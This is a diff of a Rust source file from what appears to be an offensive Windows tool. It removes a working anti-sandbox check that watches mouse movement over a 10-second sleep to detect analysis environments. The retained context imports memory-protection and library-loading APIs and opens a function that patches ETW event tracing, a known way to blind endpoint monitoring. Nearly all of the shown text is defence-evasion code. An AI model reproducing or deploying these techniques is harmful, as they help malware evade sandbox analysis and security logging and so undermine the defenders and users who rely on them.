@@ -1,8 +1,6 @@
-use crate::error::AppError;
 use core::ffi::c_void;
-use enigo::Enigo; 
-use colored::Colorize;
 use windows::core::PCSTR;
+use crate::error::AppError;
 use windows::Win32::Foundation::HINSTANCE;
 use windows::Win32::Foundation::GetLastError;
 use windows::Win32::System::Memory::VirtualProtect;
@@ -10,32 +8,6 @@ use windows::Win32::System::LibraryLoader::LoadLibraryA;
 use windows::Win32::System::LibraryLoader::GetProcAddress;
 use windows::Win32::System::Memory::PAGE_EXECUTE_READWRITE;
 use windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS;
-
-// Check for mouse pointer activity
-pub fn __check_mouse_pointer()->bool {
-    println!("[i] Checking {}","Cursor Activity".blue());
-    // Check initial location
-    let initial_cursor_location: (i32, i32) = Enigo::mouse_location();
-    let ix = initial_cursor_location.0;
-    let iy = initial_cursor_location.1;
-    println!("[i] Inital Postion: {:?}", initial_cursor_location);
-
-    // Sleep for 10s
-    let duration = std::time::Duration::new(10,0);
-    std::thread::sleep(duration);
-
-    // Check  final location
-    let final_cursor_location: (i32, i32) = Enigo::mouse_location();
-    let fx = final_cursor_location.0;
-    let fy = final_cursor_location.1;
-    println!("[i] Final Position: {:?}", final_cursor_location);
-
-    if ix == fx || iy == fy || (fy-iy) == (fx-ix) {
-        eprintln!("[!] Sandbox Environment Suspected");
-        return false;
-    }
-    true
-}
 
 pub fn patch_etw()->Result<(), AppError> {
     // Get Event Consumer from: https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/
